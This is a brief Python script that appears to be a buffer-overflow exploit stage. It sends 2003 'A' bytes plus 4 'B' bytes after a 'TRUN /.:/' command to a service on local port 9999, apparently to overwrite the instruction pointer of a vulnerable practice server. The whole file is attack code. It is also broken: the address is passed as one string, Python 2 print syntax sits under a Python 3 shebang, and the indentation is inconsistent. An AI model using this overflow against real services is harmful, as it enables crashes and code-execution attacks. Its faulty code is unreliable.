#!/usr/bin/python3
import sys, socket

shellcode = "A" * 2003 + "B" * 4

try: 
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('127.0.0.1, 9999'))
		s.send((' TRUN /.:/' + shellcode))
		s.close()

except:
	   print "Error connecting to server"
	   sys.exit()